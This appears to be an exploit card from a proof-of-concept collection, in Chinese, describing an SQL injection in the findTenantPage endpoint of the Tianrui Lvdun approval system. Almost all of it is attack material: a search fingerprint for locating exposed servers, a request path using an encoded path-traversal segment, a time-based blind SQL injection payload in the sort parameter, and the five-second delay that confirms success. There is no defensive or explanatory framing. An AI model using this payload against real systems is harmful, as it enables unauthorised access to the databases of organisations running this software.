# 天锐绿盾审批系统findTenantPage存在SQL注入

天锐绿盾 ｜ SQL注入 ｜ —
- **指纹**：`body="location.href=location.href+\"`
- **请求**：`POST /trwfe/service/.%2E/invoker/findTenantPage.do HTTP/1.1`

**Payload**
```
sort=(SELECT 2005 FROM (SELECT(SLEEP(5)))IEWh)
```
- **响应特征**：200 5s